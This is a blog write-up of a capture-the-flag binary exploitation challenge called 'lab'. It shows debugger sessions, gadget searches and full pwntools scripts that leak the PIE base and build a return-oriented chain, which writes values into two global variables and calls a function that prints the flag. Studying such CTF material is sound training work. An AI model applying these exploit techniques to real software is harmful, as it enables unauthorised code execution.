---
layout: post
title: lab writeup (HTBxUNI CTF)
---

# Summary
This challenge has PIE enabled so you have to calculate the addresses of gadgets that you are gonna be using, it requires you to write to two global variables in order to read the flag.

# Information gathering
First we have to gather some intel on the executable. To do this we make use of `ltrace`,  `gdb` and `pwntools`.

## Running the executable
To start off we run `checksec` against the executable:
```
$ checksec ./lab
[*] '/home/qh/CTF/Own/pwn/lab/lab'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
So `NX` and `PIE` are enabled and it is a 32bit executable.

Now we run the executable like it is intended:
```
$ ./lab 
Welcome to my labratory!
Feel free to use my gadgets...
If you can find them ;)
Main is at 0x565b12d4
Enter your input: abc
```
Let's run it once more for good measure:
```
$ ./lab 
Welcome to my labratory!
Feel free to use my gadgets...
If you can find them ;)
Main is at 0x565bb2d4
Enter your input: test
```
It looks like only the "address" of `main` has changed.
Let's try to do a simple buffer overflow on the input:
```
$ ./lab
Welcome to my labratory!
Feel free to use my gadgets...
If you can find them ;)
Main is at 0x5664a2d4
Enter your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                        
Segmentation fault
```
Looks like it is vulnerable to buffer overflow.

## Getting the overflow padding
Now we get the padding we require for the buffer overflow. We do this by using `gdb-peda` and `pwntools`.
First we generate a pattern with `pwntools` using the `cyclic()` function:
```python
>>> from pwn import *
>>> cyclic(150)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma'
```
Then give the pattern as an input in `gdb-peda`:
```
$ gdb ./lab -q
Reading symbols from ./lab...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/qh/CTF/Own/pwn/lab/lab
Welcome to my labratory!
Feel free to use my gadgets...
If you can find them ;)
Main is at 0x565562d4
Enter your input: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma               

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd240 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
EBX: 0x61616172 ('raaa')
ECX: 0xf7f905c0 --> 0xfbad2288
EDX: 0xf7f9189c --> 0x0
ESI: 0xf7f90000 --> 0x1d9d6c
EDI: 0xf7f90000 --> 0x1d9d6c
EBP: 0x61616173 ('saaa')
ESP: 0xffffd290 ("uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
EIP: 0x61616174 ('taaa')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61616174
[------------------------------------stack-------------------------------------]
0000| 0xffffd290 ("uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
0004| 0xffffd294 ("vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
0008| 0xffffd298 ("waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
0012| 0xffffd29c ("xaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
0016| 0xffffd2a0 ("yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
0020| 0xffffd2a4 ("zaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
0024| 0xffffd2a8 ("baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
0028| 0xffffd2ac ("caabdaabeaabfaabgaabhaabiaabjaabkaablaabma")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61616174 in ?? ()
gdb-peda$
```
The program segfaulted at the address: `0x61616174` which is `taaa` in ascii and is part of our pattern. Now we get the length of the pattern up until that part using the `fit()` function:
```
>>> len(fit({'taaa':''}))
76
```
So the length of the padding we need is 76.

## Locating useful functions, variables and gadgets
To locate useful functions, variables and gadgets we use `gdb-peda` and `ropper`.
First let's check what useful functions and variables we have:
```
$ gdb ./lab -q
Reading symbols from ./lab...(no debugging symbols found)...done.
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00001000  _init
0x00001030  printf@plt
0x00001040  fflush@plt
0x00001050  gets@plt
0x00001060  fgets@plt
0x00001070  puts@plt
0x00001080  exit@plt
[===snip===]
0x00001209  usefulGadgets
0x0000121c  checkLabOwner
0x000012d4  main
0x00001338  lab
[===snip===]
gdb-peda$ info var
All defined variables:

Non-debugging symbols:
0x00002000  _fp_hw
0x00002004  _IO_stdin_used
0x000020b0  __GNU_EH_FRAME_HDR
0x00002298  __FRAME_END__
0x00003ef0  __frame_dummy_init_array_entry
0x00003ef0  __init_array_start
0x00003ef4  __do_global_dtors_aux_fini_array_entry
0x00003ef4  __init_array_end
0x00003ef8  _DYNAMIC
0x00004000  _GLOBAL_OFFSET_TABLE_
0x00004030  __data_start
0x00004030  data_start
0x00004034  __dso_handle
0x00004038  __TMC_END__
0x00004038  __bss_start
0x00004038  _edata
0x00004038  completed
0x0000403c  userid
0x00004040  labOwner
0x00004048  _end
```
Functions that are potentially useful:
```
0x00001209  usefulGadgets
0x0000121c  checkLabOwner
0x000012d4  main
0x00001338  lab
```
Variables that are potentially useful:
```
0x0000403c  userid
0x00004040  labOwner
```

Now let's check for gadgets:
```
$ ropper --file lab --console
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
(lab/ELF/x86)> search mov
[INFO] Searching for gadgets: mov

[INFO] File: lab
0x00001406: mov ah, 0x26; add byte ptr [eax], al; add byte ptr [eax], al; lea esi, dword ptr [esi]; ret; 
0x00001161: mov al, byte ptr [0x81000000]; ret 0x2e9b; 
0x000011eb: mov byte ptr [ebx + 0x38], 1; mov ebx, dword ptr [ebp - 4]; leave; ret; 
0x00001027: mov dword ptr [8], eax; add byte ptr [eax], al; add byte ptr [eax], al; jmp dword ptr [ebx + 0xc]; 
0x00001216: mov dword ptr [edi], ebp; ret; 
0x0000139e: mov eax, dword ptr [esp]; ret; 
0x0000120a: mov ebp, esp; call 0x139e; add eax, 0x2def; mov dword ptr [edi], ebp; ret; 
0x00001146: mov ebp, esp; sub esp, 0x14; push ecx; call eax; 
0x000011a2: mov ebx, dword ptr [ebp - 4]; leave; ret; 
0x00001102: mov ebx, dword ptr [esp]; ret; 
0x00001205: mov edx, dword ptr [esp]; ret; 
0x00001346: mov esp, 0x8300002c; in al, dx; or byte ptr [ebp - 0x2d2b7d], cl; call dword ptr [eax - 0x73]; 

(lab/ELF/x86)> search pop
[INFO] Searching for gadgets: pop

[INFO] File: lab
0x00001333: pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
0x000011a3: pop ebp; cld; leave; ret; 
0x0000121a: pop ebp; ret; 
0x00001332: pop ebx; pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
0x00001400: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x0000101e: pop ebx; ret; 
0x00001331: pop ecx; pop ebx; pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
0x00001402: pop edi; pop ebp; ret; 
0x00001401: pop esi; pop edi; pop ebp; ret; 
0x00001335: popal; cld; ret;
```
Potentially useful gadgets are:
```
0x00001216: mov dword ptr [edi], ebp; ret;
0x00001402: pop edi; pop ebp; ret;
```
`checkLabOwner` seems like it is a valuable function, we can see what it does by disassembling the function:
```
gdb-peda$ disassemble checkLabOwner            
Dump of assembler code for function checkLabOwner:
   0x0000121c <+0>:     push   ebp                
   0x0000121d <+1>:     mov    ebp,esp 
   0x0000121f <+3>:     push   ebx
   0x00001220 <+4>:     sub    esp,0x34
   0x00001223 <+7>:     call   0x1110 <__x86.get_pc_thunk.bx>
   0x00001228 <+12>:    add    ebx,0x2dd8
   0x0000122e <+18>:    sub    esp,0x8
   0x00001231 <+21>:    lea    eax,[ebx-0x1ff8]
   0x00001237 <+27>:    push   eax
   0x00001238 <+28>:    lea    eax,[ebx-0x1ff6]
   0x0000123e <+34>:    push   eax
   0x0000123f <+35>:    call   0x10a0 <fopen@plt>
   0x00001244 <+40>:    add    esp,0x10
   0x00001247 <+43>:    mov    DWORD PTR [ebp-0xc],eax
   0x0000124a <+46>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x0000124e <+50>:    jne    0x126c <checkLabOwner+80>
   0x00001250 <+52>:    sub    esp,0xc
   0x00001253 <+55>:    lea    eax,[ebx-0x1fed]
   0x00001259 <+61>:    push   eax
   0x0000125a <+62>:    call   0x1070 <puts@plt>
   0x0000125f <+67>:    add    esp,0x10
   0x00001262 <+70>:    sub    esp,0xc
   0x00001265 <+73>:    push   0x0
   0x00001267 <+75>:    call   0x1080 <exit@plt>
   0x0000126c <+80>:    sub    esp,0x4
   0x0000126f <+83>:    push   DWORD PTR [ebp-0xc]
   0x00001272 <+86>:    push   0x1d
   0x00001274 <+88>:    lea    eax,[ebp-0x29]
   0x00001277 <+91>:    push   eax
   0x00001278 <+92>:    call   0x1060 <fgets@plt>
   0x0000127d <+97>:    add    esp,0x10
   0x00001280 <+100>:   sub    esp,0x4
   0x00001283 <+103>:   push   0x5
   0x00001285 <+105>:   lea    eax,[ebx-0x1fd5]
   0x0000128b <+111>:   push   eax
   0x0000128c <+112>:   lea    eax,[ebx+0x40]
   0x00001292 <+118>:   push   eax
   0x00001293 <+119>:   call   0x10b0 <strncmp@plt>
   0x00001298 <+124>:   add    esp,0x10
   0x0000129b <+127>:   test   eax,eax
   0x0000129d <+129>:   jne    0x12ce <checkLabOwner+178>
   0x0000129f <+131>:   lea    eax,[ebx+0x3c]
   0x000012a5 <+137>:   mov    eax,DWORD PTR [eax]
   0x000012a7 <+139>:   cmp    eax,0x1337
   0x000012ac <+144>:   jne    0x12ce <checkLabOwner+178>
   0x000012ae <+146>:   sub    esp,0x8
   0x000012b1 <+149>:   lea    eax,[ebp-0x29]
   0x000012b4 <+152>:   push   eax
   0x000012b5 <+153>:   lea    eax,[ebx-0x1fcf]
   0x000012bb <+159>:   push   eax
   0x000012bc <+160>:   call   0x1030 <printf@plt>
   0x000012c1 <+165>:   add    esp,0x10
   0x000012c4 <+168>:   sub    esp,0xc
   0x000012c7 <+171>:   push   0x0
   0x000012c9 <+173>:   call   0x1080 <exit@plt>
   0x000012ce <+178>:   nop
   0x000012cf <+179>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x000012d2 <+182>:   leave
   0x000012d3 <+183>:   ret
End of assembler dump.
gdb-peda$ 
```
These instructions are particulary interesting:
```
[===snip===]
   0x00001283 <+103>:   push   0x5
   0x00001285 <+105>:   lea    eax,[ebx-0x1fd5]
   0x0000128b <+111>:   push   eax
   0x0000128c <+112>:   lea    eax,[ebx+0x40]
   0x00001292 <+118>:   push   eax
   0x00001293 <+119>:   call   0x10b0 <strncmp@plt>
[===snip===]
   0x000012a5 <+137>:   mov    eax,DWORD PTR [eax]
   0x000012a7 <+139>:   cmp    eax,0x1337
   0x000012ac <+144>:   jne    0x12ce <checkLabOwner+178>
[===snip===]
```

## Calling checkLabOwner
We can try calling `checkLabOwner` to get more info on what the `strncmp` is testing. We can make a sample script to calculate the address of `checkLabOwner` and call it:
```python
from pwn import *

checkLabOwner_offset = 0x121c
main_offset = 0x12d4
padding = cyclic(76)
p = process('./lab')

p.recvuntil('Main is at ')
main = int(p.recv(10),16) #0xdeadbeef

log.info('Main is at: {}'.format(hex(main)))
base = main - main_offset
log.success('PIE base: {}'.format(hex(base)))

checkLabOwner = base + checkLabOwner_offset
p.recvuntil(': ')
payload = padding
payload += p32(checkLabOwner)

raw_input() #pause script to attach gdb to the process
p.sendline(payload)
p.interactive()
p.close()
```
Now let's test it:
```
gdb-peda$ b *checkLabOwner+119
Breakpoint 1 at 0x5664d293
gdb-peda$ c
Continuing.
[===snip===]
[-------------------------------------code-------------------------------------]
   0x5664d28b <checkLabOwner+111>:      push   eax
   0x5664d28c <checkLabOwner+112>:      lea    eax,[ebx+0x40]
   0x5664d292 <checkLabOwner+118>:      push   eax
=> 0x5664d293 <checkLabOwner+119>:      call   0x5664d0b0 <strncmp@plt>
   0x5664d298 <checkLabOwner+124>:      add    esp,0x10
   0x5664d29b <checkLabOwner+127>:      test   eax,eax
   0x5664d29d <checkLabOwner+129>:      jne    0x5664d2ce <checkLabOwner+178>
   0x5664d29f <checkLabOwner+131>:      lea    eax,[ebx+0x3c]
Guessed arguments:
arg[0]: 0x56650040 --> 0x0
arg[1]: 0x5664e02b ("QHpix")
arg[2]: 0x5
[===snip===]
gdb-peda$ x/x 0x56650040
0x56650040 <labOwner>:  0x00
```
Ok, so it checks for the string `QHpix` at `labOwner`.
Using the `mov dword ptr [edi], ebp; ret;` gadget we found earlier, we can write to that location.

# Writing an exploit
Let the fun begin.
So we know what gadgets we can use to write to `labOwner` and we have the offset of `labOwner`.
We can make the following script to make a write to `labOwner`:
```python
from pwn import *

checkLabOwner_offset = 0x121c
main_offset = 0x12d4
pop_offset = 0x1402 # pop edi; pop ebp; ret;
mov_offset = 0x1216 #mov dword ptr [edi],ebp; ret;
labOwner_offset = 0x4040
lab_offset = 0x1338
padding = cyclic(76)


# start the process
p = process('./lab')

# get the address of main and calculate the bass
p.recvuntil('Main is at ')
main = int(p.recv(10),16) #0xdeadbeef
log.info('Main is at: {}'.format(hex(main)))
base = main - main_offset
log.success('PIE base: {}'.format(hex(base)))

# calculate all addresses we need
checkLabOwner = p32(base + checkLabOwner_offset)
pop = p32(base + pop_offset)
mov = p32(base + mov_offset)
labOwner = base + labOwner_offset
lab = p32(base + lab_offset)

def write(proc, write_loc, payload, return_addr):
    proc.recvuntil(': ')
    ropchain = padding
    ropchain += pop
    ropchain += p32(write_loc)
    ropchain += payload
    ropchain += mov
    ropchain += return_addr
    proc.sendline(ropchain)

raw_input() #pause script to attach gdb to the process
write(p, labOwner, 'QHpi', lab)
write(p, labOwner+0x4, 'x\x00\x00\x00', checkLabOwner)
p.interactive()
p.close()
```
Now let's run the script and attach `gdb` to the process:
```
gdb-peda$ b *checkLabOwner+119
Breakpoint 1 at 0x565e9293
gdb-peda$ c
Continuing.
[===snip===]
[-------------------------------------code-------------------------------------]
   0x565e928b <checkLabOwner+111>:      push   eax
   0x565e928c <checkLabOwner+112>:      lea    eax,[ebx+0x40]
   0x565e9292 <checkLabOwner+118>:      push   eax
=> 0x565e9293 <checkLabOwner+119>:      call   0x565e90b0 <strncmp@plt>
   0x565e9298 <checkLabOwner+124>:      add    esp,0x10
   0x565e929b <checkLabOwner+127>:      test   eax,eax
   0x565e929d <checkLabOwner+129>:      jne    0x565e92ce <checkLabOwner+178>
   0x565e929f <checkLabOwner+131>:      lea    eax,[ebx+0x3c]
Guessed arguments:
arg[0]: 0x565ec040 ("QHpix")
arg[1]: 0x565ea02b ("QHpix")
arg[2]: 0x5
```
Yep, it is correct!. Let's check the other comparison instruction in the function:
```
gdb-peda$ b *checkLabOwner+137
Breakpoint 1 at 0x5664f2a5
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0x5665203c --> 0x0
EBX: 0x56652000 --> 0x3ef8
ECX: 0x78 ('x')
EDX: 0x56652040 ("QHpix")
ESI: 0xf7ed9000 --> 0x1d9d6c
EDI: 0x56652044 --> 0x78 ('x')
EBP: 0xffe78420 --> 0x78 ('x')
ESP: 0xffe783e8 ("jaaakaaalaaamaa")
EIP: 0x5664f2a5 (<checkLabOwner+137>:   mov    eax,DWORD PTR [eax])
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5664f29b <checkLabOwner+127>:      test   eax,eax
   0x5664f29d <checkLabOwner+129>:      jne    0x5664f2ce <checkLabOwner+178>
   0x5664f29f <checkLabOwner+131>:      lea    eax,[ebx+0x3c]
=> 0x5664f2a5 <checkLabOwner+137>:      mov    eax,DWORD PTR [eax]
   0x5664f2a7 <checkLabOwner+139>:      cmp    eax,0x1337
[===snip===]
gdb-peda$ x/x 0x5665203c
0x5665203c <userid>:    0x00
gdb-peda$ 
```
It looks like `userid` is compared to `0x1337`.
Let's change our exploit script to also write to `userid` and then call `checkLabOwner` again:
```python
from pwn import *

checkLabOwner_offset = 0x121c
main_offset = 0x12d4
pop_offset = 0x1402 # pop edi; pop ebp; ret;
mov_offset = 0x1216 #mov dword ptr [edi],ebp; ret;
labOwner_offset = 0x4040
lab_offset = 0x1338
userid_offset = 0x403c
padding = cyclic(76)

# start the process
p = process('./lab')

# get the address of main and calculate the bass
p.recvuntil('Main is at ')
main = int(p.recv(10),16) #0xdeadbeef
log.info('Main is at: {}'.format(hex(main)))
base = main - main_offset
log.success('PIE base: {}'.format(hex(base)))

# calculate all addresses we need
# functions
checkLabOwner = p32(base + checkLabOwner_offset)
lab = p32(base + lab_offset)
# gadgets
pop = p32(base + pop_offset)
mov = p32(base + mov_offset)
#variables
labOwner = base + labOwner_offset
userid = base + userid_offset

def write(proc, write_loc, payload, return_addr):
    proc.recvuntil(': ')
    ropchain = padding
    ropchain += pop
    ropchain += p32(write_loc)
    ropchain += payload
    ropchain += mov
    ropchain += return_addr
    proc.sendline(ropchain)

write(p, labOwner, 'QHpi', lab)
write(p, labOwner+0x4, 'x\x00\x00\x00', lab)
write(p, userid, p32(0x1337), checkLabOwner)
log.success(p.recv())
p.close()
```
Now let's run the exploit:
```
$ python exploit.py
[+] Starting local process './lab': pid 69181
[*] Main is at: 0x565902d4
[+] PIE base: 0x5658f000
[+] Flag: flag{g4d6e7_1abor4t0ry_4634}
[*] Process './lab' stopped with exit code 0 (pid 69181)
```
Success! We got the flag!
